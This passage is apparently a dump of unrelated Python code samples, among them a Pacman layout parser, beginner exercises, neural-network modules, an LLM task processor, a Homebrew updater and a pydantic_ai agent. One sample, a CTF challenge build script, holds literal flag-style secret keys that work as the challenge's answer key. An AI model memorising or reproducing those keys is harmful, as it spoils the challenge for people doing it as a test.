input format to the (x,y) convention here\n\n        The shape of the maze.  Each character\n        represents a different type of object.\n         % - Wall\n         . - Food\n         o - Capsule\n         G - Ghost\n         P - Pacman\n        Other characters are ignored.\n        \"\"\"\n        maxY = self.height - 1\n        for y in range(self.height):\n            for x in range(self.width):\n                layoutChar = layoutText[maxY - y][x]\n                self.processLayoutChar(x, y, layoutChar)\n        self.agentPositions.sort()\n        self.agentPositions = [ ( i == 0, pos) for i, pos in self.agentPositions]\n\n    def processLayoutChar(self, x, y, layoutChar):\n        if layoutChar == '%':\n            self.walls[x][y] = True\n        elif layoutChar == '.':\n            self.food[x][y] = True\n        elif layoutChar == 'o':\n            self.capsules.append((x, y))\n        elif layoutChar == 'P':\n            self.agentPositions.append( (0, (x, y) ) )\n        elif layoutChar in ['G']:\n            self.agentPositions.append( (1, (x, y) ) )\n            self.numGhosts += 1\n        elif layoutChar in  ['1', '2',",
    "#'Day 2: 30 Days of python programming'\r\n\r\nfirst_name = \"Camilo\"\r\nprint(first_name)\r\nprint(type(first_name))\r\nprint(len(first_name))\r\n\r\nlast_name = \"Alvarez\"\r\nprint(last_name)\r\nprint(type(last_name))\r\nprint(len(last_name))\r\n\r\n# we are compare the length of the first name and the last name \r\n\r\nif len(first_name)==   len(last_name):\r\n    print(\"the length is the same\")\r\n\r\nelif len(first_name)> len(last_name):\r\n    print(\"the fisrt name is longest than the last name\")\r\n\r\nelse:\r\n    print(\"the last name is longest than the first name \")\r\n\r\nfull_name = \"Camilo Alvarez\"\r\nprint(full_name)\r\nprint(type(full_name))\r\n\r\ncountrie = \"Colombia\"\r\nprint(countrie)\r\nprint(type(countrie))\r\n\r\ncity= \"Medellin\"\r\nprint(city)\r\nprint(type(city))\r\n\r\nage = 18\r\nprint(age)\r\nprint(type(age))\r\n\r\nyear = 2024\r\nprint(year)\r\nprint(type(year))\r\n\r\n\r\nis_married = False\r\nprint(is_married)\r\nprint(type(is_married))\r\n\r\nis_true = True\r\nprint(is_true)\r\nprint(type(is_true))\r\n\r\nis_ligth_on = True\r\nprint(is_ligth_on)\r\nprint(type(is_ligth_on))\r\n\r\nnum1, num2, num3, num4, num5 = 1, 4, 5, 5.6, 7.6\r\nprint(num1, num2, num3, num4, num5)\r\nprint(type(num1))\r\nprint(type(num2))\r\nprint(type(num3))\r\nprint(type(num4))\r\nprint(type(num5))\r\n\r\nnum_one = 5\r\n\r\nnum_two = 4\r\n\r\ntotal_variable = num_one + num_two\r\nprint(total_variable)\r\n\r\ndiff_variable = num_one-num_two\r\nprint (diff_variable)\r\n\r\nproduct_variable = num_one*num_two\r\nprint(product_variable)\r\n\r\ndivision_variable = num_one/num_two\r\nprint(division_variable)\r\n\r\nremainder_variable = num_one % num_two\r\nprint(remainder_variable)\r\n\r\nexp_variable = num_one**num_two\r\nprint(exp_variable)\r\n\r\nfloor_division_variable = num_one//num_two\r\nprint(floor_division_variable)\r\n\r\nradius = 30\r\narea_circle = 3.14*(radius*radius)\r\nprint(area_circle)\r\n\r\ncircum_of_circle = 2 * 3.14 * radius\r\nprint(circum_of_circle)\r\n\r\nradius = int(input(\"choose the radius you want \"))\r\narea_circle = 3.14*(radius*radius)\r\nprint(area_circle)\r\n\r\nfirst_name = input(\"write your first name:\")\r\nprint(first_name)\r\n\r\nlast_name = input(\"write your last name: \")\r\nprint(last_name)\r\n\r\ncountrie = input(\"write the countrie that do you from\")\r\nprint(countrie)\r\n\r\ncity= input(\"write the city thah do you live\")\r\nprint(city)\r\n\r\nage = input(\"write your age\")\r\nprint(age)\r\n\r\nfor i in range(1,101):\r\n    if i % 3 == 0 and i % 5 == 0:\r\n        print(\"fizz buzz\")\r\n    elif i % 5 == 0:\r\n        print(\"buzz\")\r\n    elif i % 3 == 0:\r\n        print(\"fizz\")\r\n    else:\r\n        print(i)",
    "import os\nimport subprocess\n\nfrom rknazo.anura.utils import wrap_flag\nfrom rknazo.peson.types import (\n    BuildResult,\n    BuildSettings,\n    Context,\n    LoggerConfig,\n    PrerunProgram,\n    ProdProperty,\n)\n\nfrom environ.packages.apk import ApkPackage\nfrom environ.packages.rust import Rust\n\nLITCRYPT_KEY = \"rknazo{1t's-a-hUg3-c4@11eng3-w0rk1ng-w1th-n3tw0rk}\"\nKEY = \"rknazo{1t's-@-GI@NT-St3p-to-f1nd-1t!}\"\n\nsettings = BuildSettings(required_packages={Rust})\n\n\ndef build(context: Context) -> BuildResult:\n    os.chdir(\"daemon\")\n\n    # === build ===\n\n    flag = wrap_flag(context.flag)\n    lib_rs_code = f\"\"\"\nuse litcrypt::{{lc, use_litcrypt}};\nuse once_cell::sync::Lazy;\n\nuse_litcrypt!();\n\npub static KEY: Lazy<String> = Lazy::new(|| lc!(\"{KEY}\"));\npub static FLAG: Lazy<String> = Lazy::new(|| lc!(\"{flag}\"));\n\"\"\"\n\n    with open(\"src/lib.rs\", \"w\") as fp:\n        fp.write(lib_rs_code)\n\n    env = os.environ.copy()\n    env[\"LITCRYPT_ENCRYPT_KEY\"] = LITCRYPT_KEY\n\n    subprocess.check_call([\"cargo\", \"build\", \"--release\"], env=env)\n\n    # === build ===\n\n    os.chdir(\"../\")\n\n    os.rename(\"daemon/target/release/daemon\", \".daemon\")\n\n    logger = LoggerConfig(name=\"easy_http\", stdout=True, stderr=True)\n    daemon = PrerunProgram(cmd=[\"./.daemon\"], logger=logger, daemon=True)\n    prop = ProdProperty(\n        required_packages={ApkPackage(\"tcpdump\"), ApkPackage(\"curl\")},\n        prerun_programs=[daemon],\n    )\n\n    return BuildResult(artifacts=[\".daemon\", \"tips.txt\"], prop=prop)\n",
    "# Copyright (c) 2023 Amphion.\n#\n# This source code is licensed under the MIT license found in the\n# LICENSE file in the root directory of this source tree.\n\nimport torch\nfrom torch import nn\nfrom torch.nn import functional as F\n\n\nclass LayerNorm(nn.Module):\n    def __init__(self, channels, eps=1e-5):\n        super().__init__()\n        self.channels = channels\n        self.eps = eps\n\n        self.gamma = nn.Parameter(torch.ones(channels))\n        self.beta = nn.Parameter(torch.zeros(channels))\n\n    def forward(self, x):\n        x = x.transpose(1, -1)\n        x = F.layer_norm(x, (self.channels,), self.gamma, self.beta, self.eps)\n        return x.transpose(1, -1)\n\n\nclass ConvReluNorm(nn.Module):\n    def __init__(\n        self,\n        in_channels,\n        hidden_channels,\n        out_channels,\n        kernel_size,\n        n_layers,\n        p_dropout,\n    ):\n        super().__init__()\n        self.in_channels = in_channels\n        self.hidden_channels = hidden_channels\n        self.out_channels = out_channels\n        self.kernel_size = kernel_size\n        self.n_layers = n_layers\n        self.p_dropout = p_dropout\n        assert n_layers > 1, \"Number of layers should be larger than 0.\"\n\n        self.conv_layers = nn.ModuleList()\n        self.norm_layers = nn.ModuleList()\n        self.conv_layers.append(\n            nn.Conv1d(\n                in_channels, hidden_channels, kernel_size, padding=kernel_size // 2\n            )\n        )\n        self.norm_layers.append(LayerNorm(hidden_channels))\n        self.relu_drop = nn.Sequential(nn.ReLU(), nn.Dropout(p_dropout))\n        for _ in range(n_layers - 1):\n            self.conv_layers.append(\n                nn.Conv1d(\n                    hidden_channels,\n                    hidden_channels,\n                    kernel_size,\n                    padding=kernel_size // 2,\n                )\n            )\n            self.norm_layers.append(LayerNorm(hidden_channels))\n        self.proj = nn.Conv1d(hidden_channels, out_channels, 1)\n        self.proj.weight.data.zero_()\n        self.proj.bias.data.zero_()\n\n    def forward(self, x, x_mask):\n        x_org = x\n        for i in range(self.n_layers):\n            x = self.conv_layers[i](x * x_mask)\n            x = self.norm_layers[i](x)\n            x = self.relu_drop(x)\n        x = x_org + self.proj(x)\n        return x * x_mask\n",
    "#!/usr/bin/env python3\n\nimport os\nimport json\nfrom typing import List, Dict, Optional\nfrom datetime import datetime\nfrom openai import OpenAI\n\nclass AITaskProcessor:\n    def __init__(self):\n        self.model = \"gpt-4\"  # \u30c7\u30d5\u30a9\u30eb\u30c8\u30e2\u30c7\u30eb\n        self.client = OpenAI(api_key=os.getenv(\"OPENAI_API_KEY\"))\n        \n    def analyze_task(self, task: Dict) -> Dict:\n        \"\"\"\n        \u30bf\u30b9\u30af\u3092\u5206\u6790\u3057\u3001AI\u306b\u3088\u308b\u63d0\u6848\u3092\u751f\u6210\n        \n        Args:\n            task: \u5206\u6790\u5bfe\u8c61\u306e\u30bf\u30b9\u30af\u60c5\u5831\n            \n        Returns:\n            AI\u5206\u6790\u7d50\u679c\u3092\u542b\u3080\u30bf\u30b9\u30af\u60c5\u5831\n        \"\"\"\n        prompt = f\"\"\"\n\u30bf\u30b9\u30af\u5206\u6790:\nID: {task[\"id\"]}\n\u30bf\u30a4\u30c8\u30eb: {task[\"title\"]}\n\u8aac\u660e: {task.get(\"description\", \"\")}\n\n\u4ee5\u4e0b\u306e\u89b3\u70b9\u3067\u5206\u6790\u3057\u3066\u304f\u3060\u3055\u3044\uff1a\n1. \u30bf\u30b9\u30af\u306e\u8907\u96d1\u3055\u3068\u898b\u7a4d\u3082\u308a\u6642\u9593\n2. \u5fc5\u8981\u306a\u30b9\u30ad\u30eb\u3068\u77e5\u8b58\n3. \u4eba\u9593\u3068AI\u306e\u5f79\u5272\u5206\u62c5\u306e\u63d0\u6848\n4. \u30ea\u30b9\u30af\u3068\u6ce8\u610f\u70b9\n\n\u56de\u7b54\u306f\u4ee5\u4e0b\u306e\u5f62\u5f0f\u3067JSON\u5f62\u5f0f\u3067\u8fd4\u3057\u3066\u304f\u3060\u3055\u3044\uff1a\n{{\n    \"complexity\": \"\u9ad8/\u4e2d/\u4f4e\",\n    \"estimated_hours\": \u6570\u5024,\n    \"required_skills\": [\"\u30b9\u30ad\u30eb1\", \"\u30b9\u30ad\u30eb2\"],\n    \"ai_human_split\": {{\n        \"ai_tasks\": [\"\u30bf\u30b9\u30af1\", \"\u30bf\u30b9\u30af2\"],\n        \"human_tasks\": [\"\u30bf\u30b9\u30af1\", \"\u30bf\u30b9\u30af2\"]\n    }},\n    \"risks\": [\"\u30ea\u30b9\u30af1\", \"\u30ea\u30b9\u30af2\"]\n}}\n\"\"\"\n        try:\n            response = self.client.chat.completions.create(\n                model=self.model,\n                messages=[\n                    {\"role\": \"system\", \"content\": \"\u3042\u306a\u305f\u306f\u30d7\u30ed\u30b8\u30a7\u30af\u30c8\u30de\u30cd\u30fc\u30b8\u30e3\u30fc\u306e\u30a2\u30b7\u30b9\u30bf\u30f3\u30c8\u3067\u3059\u3002\"},\n                    {\"role\": \"user\", \"content\": prompt}\n                ]\n            )\n            analysis = json.loads(response.choices[0].message.content)\n            task[\"ai_analysis\"] = analysis\n            return task\n        except Exception as e:\n            print(f\"Error analyzing task: {e}\")\n            return task\n\n    def suggest_breakdown(self, project: Dict) -> List[Dict]:\n        \"\"\"\n        \u30d7\u30ed\u30b8\u30a7\u30af\u30c8\u3092\u5b9f\u884c\u53ef\u80fd\u306a\u30bf\u30b9\u30af\u306b\u5206\u89e3\u3059\u308b\u63d0\u6848\u3092\u751f\u6210\n        \n        Args:\n            project: \u5206\u89e3\u5bfe\u8c61\u306e\u30d7\u30ed\u30b8\u30a7\u30af\u30c8\u60c5\u5831\n            \n        Returns:\n            \u63d0\u6848\u3055\u308c\u305f\u30b5\u30d6\u30bf\u30b9\u30af\u306e\u30ea\u30b9\u30c8\n        \"\"\"\n        prompt = f\"\"\"\n\u30d7\u30ed\u30b8\u30a7\u30af\u30c8\u5206\u89e3:\nID: {project['id']}\n\u30bf\u30a4\u30c8\u30eb: {project['title']}\n\u8aac\u660e: {project.get('description', '')}\n\n\u3053\u306e\u30d7\u30ed\u30b8\u30a7\u30af\u30c8\u3092\u5b9f\u884c\u53ef\u80fd\u306a\u5177\u4f53\u7684\u306a\u30bf\u30b9\u30af\u306b\u5206\u89e3\u3057\u3066\u304f\u3060\u3055\u3044\u3002\n\u5404\u30bf\u30b9\u30af\u306b\u306f\u4ee5\u4e0b\u306e\u60c5\u5831\u3092\u542b\u3081\u3066\u304f\u3060\u3055\u3044\uff1a\n- \u30bf\u30a4\u30c8\u30eb\n- \u8aac\u660e\n- \u30bf\u30a4\u30d7\uff08task/project\uff09\n- \u62c5\u5f53\uff08human/ai/both\uff09\n- \u512a\u5148\u5ea6\uff08high/medium/low\uff09\n\n\u56de\u7b54\u306fJSON\u5f62\u5f0f\u3067\u8fd4\u3057\u3066\u304f\u3060\u3055\u3044\u3002\n\"\"\"\n        try:\n            response = self.client.chat.completions.create(\n                model=self.model,\n                messages=[\n                    {\"role\": \"system\", \"content\": \"\u3042\u306a\u305f\u306f\u30d7\u30ed\u30b8\u30a7\u30af\u30c8\u30de\u30cd\u30fc\u30b8\u30e3\u30fc\u306e\u30a2\u30b7\u30b9\u30bf\u30f3\u30c8\u3067\u3059\u3002\"},\n                    {\"role\": \"user\", \"content\": prompt}\n                ]\n            )\n            subtasks = json.loads(response.choices[0].message.content)\n            return subtasks\n        except Exception as e:\n            print(f\"Error suggesting breakdown: {e}\")\n            return []\n\n    def translate_content(self, content: str, target_langs: List[str]) -> Dict[str, str]:\n        \"\"\"\n        \u30b3\u30f3\u30c6\u30f3\u30c4\u3092\u6307\u5b9a\u3055\u308c\u305f\u8a00\u8a9e\u306b\u7ffb\u8a33\n        \n        Args:\n            content: \u7ffb\u8a33\u5bfe\u8c61\u306e\u30b3\u30f3\u30c6\u30f3\u30c4\n            target_langs: \u7ffb\u8a33\u5148\u8a00\u8a9e\u306e\u30ea\u30b9\u30c8\uff08\u4f8b\uff1a[\"en\", \"zh\", \"ko\", \"vi\"]\uff09\n            \n        Returns:\n            \u8a00\u8a9e\u30b3\u30fc\u30c9\u3092\u30ad\u30fc\u3068\u3059\u308b\u7ffb\u8a33\u7d50\u679c\u306e\u8f9e\u66f8\n        \"\"\"\n        translations = {}\n        lang_names = {\n            \"en\": \"English\",\n            \"zh\": \"Chinese\",\n            \"ko\": \"Korean\",\n            \"vi\": \"Vietnamese\"\n        }\n        \n        for lang in target_langs:\n            prompt = f\"\"\"\n\u4ee5\u4e0b\u306e\u65e5\u672c\u8a9e\u30c6\u30ad\u30b9\u30c8\u3092{lang_names.get(lang, lang)}\u306b\u7ffb\u8a33\u3057\u3066\u304f\u3060\u3055\u3044\uff1a\n\n{content}\n\n\u7ffb\u8a33\u306e\u969b\u306f\u4ee5\u4e0b\u306e\u70b9\u306b\u6ce8\u610f\u3057\u3066\u304f\u3060\u3055\u3044\uff1a\n1. \u6587\u5316\u7684\u306a\u6587\u8108\u3092\u8003\u616e\u3059\u308b\n2. \u5c02\u9580\u7528\u8a9e\u306f\u9069\u5207\u306b\u7ffb\u8a33\u3059\u308b\n3. \u81ea\u7136\u306a\u8868\u73fe\u3092\u5fc3\u304c\u3051\u308b\n\"\"\"\n            try:\n                response = self.client.chat.completions.create(\n                    model=self.model,\n                    messages=[\n                        {\"role\": \"system\", \"content\": \"\u3042\u306a\u305f\u306f\u5c02\u9580\u7684\u306a\u7ffb\u8a33\u8005\u3067\u3059\u3002\"},\n                        {\"role\": \"user\", \"content\": prompt}\n                    ]\n                )\n                translations[lang] = response.choices[0].message.content.strip()\n            except Exception as e:\n                print(f\"Error translating to {lang}: {e}\")\n                translations[lang] = f\"Translation error: {str(e)}\"\n        \n        return translations\n\n# End of AITaskProcessor class\n",
    "import json\nimport os\nimport subprocess\nimport threading\nimport time\n\nimport click\n\nfrom snippy.constants import (\n    BASE_DIR,\n    CACHE_EXPIRATION_TIME,\n    LATEST_VERSION_PATH,\n    VERSION_CACHE_PATH,\n)\nfrom snippy.utils.animation_utils import show_loading_animation\n\n\ndef update_brew():\n    try:\n        result = subprocess.run(\n            [\"brew\", \"update\"],\n            stdout=subprocess.PIPE,\n            stderr=subprocess.PIPE,\n            text=True,\n        )\n        if result.returncode == 0:\n            click.echo(\"Homebrew updated successfully!\")\n        else:\n            click.echo(f\"Error updating Homebrew: {result.stderr}\")\n    except Exception as e:\n        click.echo(f\"Failed to update Homebrew: {e}\")\n\n\ndef update_snippy():\n    stop_animation = show_loading_animation(message=\"\ud83d\udd75\ufe0f  Checking for updates...\")\n    try:\n        update_brew()\n\n        result = subprocess.run(\n            [\"brew\", \"upgrade\", \"snippy\"],\n            stdout=subprocess.PIPE,\n            stderr=subprocess.PIPE,\n            text=True,\n        )\n        stop_animation.set()\n        if result.returncode == 0:\n            click.echo(\n                click.style(\n                    \"\\nSnippy has been updated to the latest version! \ud83c\udf89\", fg=\"green\"\n                )\n            )\n        else:\n            click.echo(\n                click.style(f\"\\nFailed to update Snippy: {result.stderr}\", fg=\"red\")\n            )\n    except Exception as e:\n        stop_animation.set()\n        click.echo(click.style(f\"\\nAn error occurred during the update: {e}\", fg=\"red\"))\n\n\ndef save_latest_version(latest_version):\n    os.makedirs(BASE_DIR, exist_ok=True)\n    with open(LATEST_VERSION_PATH, \"w\") as f:\n        json.dump({\"latest_version\": latest_version}, f)\n\n\ndef save_installed_version(installed_version):\n    os.makedirs(BASE_DIR, exist_ok=True)\n    with open(VERSION_CACHE_PATH, \"w\") as f:\n        json.dump({\"installed_version\": installed_version}, f)\n\n\ndef is_cache_expired(file_path):\n    if not os.path.exists(file_path):\n        return True\n    last_modified = os.path.getmtime(file_path)\n    return (time.time() - last_modified) > CACHE_EXPIRATION_TIME\n\n\ndef fetch_latest_version():\n    try:\n        result = subprocess.run(\n            [\"brew\", \"info\", \"--json=v2\", \"snippy\"],\n            stdout=subprocess.PIPE,\n            stderr=subprocess.PIPE,\n            text=True,\n        )\n        if result.returncode == 0:\n            data = json.loads(result.stdout)\n            latest_version = data[\"formulae\"][0][\"versions\"][\"stable\"]\n            save_latest_version(latest_version)\n            return latest_version\n        else:\n            print(f\"Error fetching latest version: {result.stderr}\")\n    except Exception as e:\n        print(f\"Failed to fetch the latest version: {e}\")\n    return None\n\n\ndef fetch_latest_version_in_background():\n    def fetch():\n        fetch_latest_version()\n\n    thread = threading.Thread(target=fetch, daemon=True)\n    thread.start()\n    thread.join()\n\n\ndef load_latest_version():\n    if not os.path.exists(LATEST_VERSION_PATH) or is_cache_expired(LATEST_VERSION_PATH):\n        fetch_latest_version_in_background()\n        return None\n    try:\n        with open(LATEST_VERSION_PATH, \"r\") as f:\n            return json.load(f).get(\"latest_version\")\n    except FileNotFoundError:\n        return None\n\n\ndef fetch_installed_version():\n    try:\n        result = subprocess.run(\n            [\"brew\", \"list\", \"--versions\", \"snippy\"],\n            stdout=subprocess.PIPE,\n            stderr=subprocess.PIPE,\n            text=True,\n        )\n        if result.returncode == 0:\n            installed_version = result.stdout.strip().split()[1]\n            save_installed_version(installed_version)\n            return installed_version\n        else:\n            print(f\"Error fetching installed version: {result.stderr}\")\n    except Exception as e:\n        print(f\"Failed to fetch the installed version: {e}\")\n    return None\n\n\ndef fetch_installed_version_with_animation():\n    stop_animation = show_loading_animation(\n        message=\"\ud83d\udd75\ufe0f  Checking for installed version...\"\n    )\n    installed_version = fetch_installed_version()\n    stop_animation.set()\n    print(\"\\n\", end=\"\")\n    return installed_version\n\n\ndef load_installed_version():\n    try:\n        with open(VERSION_CACHE_PATH, \"r\") as f:\n            return json.load(f).get(\"installed_version\")\n    except FileNotFoundError:\n        return fetch_installed_version()\n\n\ndef check_version():\n    installed_version = load_installed_version()\n    latest_version = load_latest_version()\n\n    if installed_version is None or latest_version is None:\n        return\n\n    if not installed_version:\n        click.echo(\"Unable to fetch the installed version. \ud83d\ude22\")\n        return\n\n    if installed_version != latest_version:\n        click.echo(\n            f\"\ud83c\udd95\u2728 Current installed version: {installed_version}, Latest version: {latest_version} \ud83e\udd28\"\n        )\n        update = click.prompt(\"Would you like to update? (y/N)\", type=str, d",
    "from __future__ import annotations\n\nfrom dataclr._typing import DataSplits\nfrom dataclr.feature_selector._hash import get_combination_hash\nfrom dataclr.methods.method import Method\nfrom dataclr.results import Result, ResultPerformance\n\n\nclass GraphNode:\n    def __init__(\n        self,\n        feature_list: list[str],\n        future_methods: set[Method],\n        method: Method = None,\n        result: Result = None,\n        parent: GraphNode = None,\n    ) -> None:\n        self.feature_list = feature_list\n        self.future_methods = future_methods\n        self.method = method\n        self.result = result\n        self.parent = parent\n\n    def get_results(\n        self,\n        data_splits: DataSplits,\n        cached_results: dict[int, list[Result]],\n        cached_performance: dict[int, ResultPerformance],\n        method: Method,\n        keep_features: list[str] = [],\n    ) -> list[Result]:\n        if method is None:\n            raise ValueError(\"Error in get_results!\")\n\n        combination_hash = get_combination_hash({method}, self.feature_list)\n        if combination_hash in cached_results:\n            return cached_results[combination_hash]\n\n        filtered_data_splits = DataSplits(\n            X_train=data_splits[\"X_train\"][self.feature_list],\n            y_train=data_splits[\"y_train\"],\n            X_test=data_splits[\"X_test\"][self.feature_list],\n            y_test=data_splits[\"y_test\"],\n        )\n\n        results = method._get_results(\n            filtered_data_splits, cached_performance, keep_features\n        )\n        cached_results[combination_hash] = results\n\n        return results\n",
    "from pydantic import BaseModel, Field\nfrom pydantic_ai import Agent, ModelRetry, RunContext, Tool\nfrom pydantic_ai.models.ollama import OllamaModel\nfrom pydantic_ai.models.openai import OpenAIModel\n\n# import safe sandbox \nfrom llm_sandbox import SandboxSession\n\n\nmodel = OllamaModel( model_name='Replete-LLM-V2.5-Qwen-32b-Q5_K_S')\n\n\nagent = Agent(\n    model=model,\n    system_prompt=(\n        \"You are an intelligent research agent. \"\n        \"Analyze user request carefully and provide structured responses\"\n        \"you have access to multiple tools, use suitble tools to fullfil user request\"\n    ),\n    result_retries = 3\n)\n\n@agent.tool_plain\ndef execute_python_code(code) -> str:\n    \"\"\"\n    Send the python code as input string you can use it as well for math and print the results\n    note: Don't use any library need to be installed with pip \n    args:\n     code(str): The code to run. send it as string\n    return: code execution results as text\n    \"\"\"\n\n    with SandboxSession(image=\"python:3.14.0a3\", lang=\"python\", keep_template=True) as session:\n        result = session.run(code)\n        return(result.text)\n\n\n\nrequest_msg = \"tell me current date and time\"\nresponse = agent.run_sync(request_msg)\nprint(response.data)\n\n#answer should be = 4.50906873475019\nrequest_msg = \"what is the area of square has length of 2.123456789 cm, use coding to calculate accuratly\"\nresponse = agent.run_sync(request_msg)\nprint(response.data)\n",
    "# Copyright (c) 2025 JD.com, Inc. and affiliates.\n# \n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n# \n#     https://www.apache.org/licenses/LICENSE-2.0\n# \n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n#\n# This file contains code from Deep3DFaceRecon_pytorch (Copyright (c) 2022 Sicheng Xu),\n# licensed under the MIT License, available at https://github.com/sicxu/Deep3DFaceRecon_pytorch.\n\n\"\"\"This package contains modules related to objective functions, optimizations, and network architectures.\n\nTo add a custom model class called 'dummy', you need to add a file called 'dummy_model.py' and define a subclass DummyModel inherited from BaseModel.\nYou need to implement the following five functions:\n    -- <__init__>:                      initialize the class; first call BaseModel.__init__(self, opt).\n    -- <set_input>:                     unpack data from dataset and apply preprocessing.\n    -- <forward>:                       produce intermediate results.\n    -- <optimize_parameters>:           calculate loss, gradients, and update network weights.\n    -- <modify_commandline_options>:    (optionally) add model-specific options and set default options.\n\nIn the function <__init__>, you need to define four lists:\n    -- self.loss_names (str list):          specify the training losses that you want to plot and save.\n    -- self.model_names (str list):         define networks used in our training.\n    -- self.visual_names (str list):        specify the images that you want to display and save.\n    -- self.optimizers (optimizer list):    define and initialize optimizers. You can define one optimizer for each network. If two networks are updated at the same time, you can use itertools.chain to group them. See cycle_gan_model.py for an usage.\n\nNow you can use the model class by specifying flag '--model dummy'.\nSee our template model class 'template_model.py' for more details.\n\"\"\"\n\nimport importlib\nfrom deep3d_facerecon.models.base_model import BaseModel\n\n\ndef find_model_using_name(model_name):\n    \"\"\"Import the module \"models/[model_name]_model.py\".\n\n    In the file, the class called DatasetNameModel() will\n    be instantiated. It has to be a subclass of BaseModel,\n    and it is case-insensitive.\n    \"\"\"\n    model_filename = \"deep3d_facerecon.models.\" + model_name + \"_model\"\n    modellib = importlib.import_module(model_filename)\n    model = None\n    target_model_name = model_name.replace('_', '') + 'model'\n    for name, cls in modellib.__dict__.items():\n        if name.lower() == target_model_name.lower() \\\n           and issubclass(cls, BaseModel):\n            model = cls\n\n    if model is None:\n        print(\"In %s.py, there should be a subclass of BaseModel with class name that matches %s in lowercase.\" % (model_filename, target_model_name))\n        exit(0)\n\n    return model\n\n\ndef get_option_setter(model_name):\n    \"\"\"Return the static method <modify_commandline_options> of the model class.\"\"\"\n    model_class = find_model_using_name(model_name)\n    return model_class.modify_commandline_options\n\n\ndef create_model(opt):\n    \"\"\"Create a model given the option.\n\n    This function warps the class CustomDatasetDataLoader.\n    This is the main interface between this package and 'train.py'/'test.py'\n\n    Example:\n        >>> from models import create_model\n        >>> model = create_model(opt)\n    \"\"\"\n    model = find_model_using_name(opt.model)\n    instance = model(opt)\n    #print(\"model [%s] was created\" % type(instance).__name__)\n    return instance\n",
    "import pickle\nimport random\nimport math\nimport torch\nimport torch.nn as nn\nimport torch.nn.functional as F\nfrom torchvision import datasets, transforms\n\ndevice = \"cuda\"\n\nclass ReLU_full_grad(torch.autograd.Function):\n    \"\"\" ReLU activation function that passes through the gradient irrespective of its input value. \"\"\"\n\n    @staticmethod\n    def forward(input):\n        return input.clamp(min=0)\n\n    @staticmethod\n    def backward(grad_output):\n        return grad_output.clone()\n\nclass FwdFwdModel(torch.nn.Module):\n    def __init__(self, layers):\n        super(FwdFwdModel, self).__init__()\n\n        self.act_fn = nn.ReLU()\n\n        self.model = nn.ModuleList([])\n        self.optimizers = []\n        for i in range(len(layers) - 1):\n            self.model.append(nn.Linear(layers[i], layers[i+1]))\n            self.optimizers.append(torch.optim.Adam(self.model[len(self.model) - 1].parameters(), lr=0.01))\n\n        self.ff_loss = nn.BCEWithLogitsLoss()\n\n        self.linear_classifer = nn.Sequential(\n            # TODO (should we omit the first Linear from classifier?)\n            nn.Linear(sum(layers[1:]), 10, bias=False) # 10 = the number of classes\n        )\n        self.classification_loss = nn.CrossEntropyLoss()\n\n        self._init_weights()\n\n    def _init_weights(self):\n        # TODO (understand this param init fn)\n        for m in self.model.modules():\n            if isinstance(m, nn.Linear):\n                torch.nn.init.normal_(m.weight, mean=0, std=1 / math.sqrt(m.weight.shape[0]))\n            # torch.nn.init.zeros_(m.bias)\n\n        for m in self.linear_classifer.modules():\n            if isinstance(m, nn.Linear):\n                nn.init.zeros_(m.weight)\n\n    def _calc_ff_loss(self, z, labels, k=1):\n        sum_of_squares = torch.sum(z ** 2, dim=-1)\n        logits = sum_of_squares - z.shape[-1]*k\n        logits = torch.reshape(torch.sigmoid(logits), (len(z), 1))\n        ff_loss = self.ff_loss(logits, labels)\n\n        return ff_loss, sum_of_squares\n\n    def _layer_norm(self, z, eps=1e-8):\n        return z / (torch.sqrt(torch.mean(z ** 2, dim=-1, keepdim=True)) + eps)\n\n    def _linear_classifier_fwd(self, input, label):\n        # append all weight tensors into single tensor\n        neural_sample = input[0]\n        for i in range(1, len(input)):\n            # TODO (line below might break when batch size > 1)\n            neural_sample = torch.cat((neural_sample, input[i]), -1)\n\n        # forward pass through classifier\n        output = self.linear_classifer(neural_sample.detach())\n        output = output - torch.max(output, dim=-1, keepdim=True)[0] # TODO (not entirely clear what this is for)\n        \n        # loss\n        classification_loss = self.classification_loss(output, label*1.0)\n\n        # return\n        return classification_loss, output\n\n    def forward(self, inputs, ff_labels, class_labels):\n        # scalar_outputs = {\n        #     \"Loss\": torch.zeros(1, device=\"cpu\")\n        # }\n\n\n        z = inputs\n\n        optim_idx = 0\n        neural_sample = []\n        for idx, layer in enumerate(self.model):\n            z = z.detach()  # Detach to ensure no computation graph reuse\n            z.requires_grad_()\n            z = layer(z)\n            z = self.act_fn(z) # forward through layer\n            neural_sample.append(z)\n            ff_loss, _ = self._calc_ff_loss(z, ff_labels, k=0.5) # calc layer wise loss\n            self.optimizers[optim_idx].zero_grad()\n\n            ff_loss.backward() # compute gradients for layer\n\n            self.optimizers[optim_idx].step() # step forward\n            optim_idx += 1\n\n            z = self._layer_norm(z) # normalize for next layer\n\n\n        # only do the fwd pass on linear classifier if the data is positive\n        if ff_labels[0]:\n            return self._linear_classifier_fwd(neural_sample, class_labels)\n        return None, None\n\n    def get_linear_classifier_param(self):\n        return self.linear_classifer.parameters()\n\n    def infer(self, inputs):\n        z = inputs\n        neural_sample = []\n        with torch.no_grad():\n            for idx, layer in enumerate(self.model):\n                z = layer(z)\n                z = self.act_fn(z)\n                z = self._layer_norm(z)\n                neural_sample.append(z)\n            lr_input = neural_sample[0]\n            for i in range(1, len(neural_sample)):\n                lr_input = torch.cat((lr_input, neural_sample[i]), -1)\n            output = self.linear_classifer(lr_input)\n            output = output - torch.max(output, dim=-1, keepdim=True)[0]\n            return output\n\n    def get_goodness(self, inputs):\n        with torch.no_grad():\n            sum_of_squares = torch.zeros(len(inputs)).to(device)\n            z = inputs\n            for idx, layer in enumerate(self.model):\n                z = layer(z)\n                z = self.act_fn(z)\n                z = self._layer_norm(z)\n                sum_of_squares += torch.sum(z ** 2, dim=-1)\n        return sum_of_squares.reshape((len(inputs), 1))\n\n    def slower_",
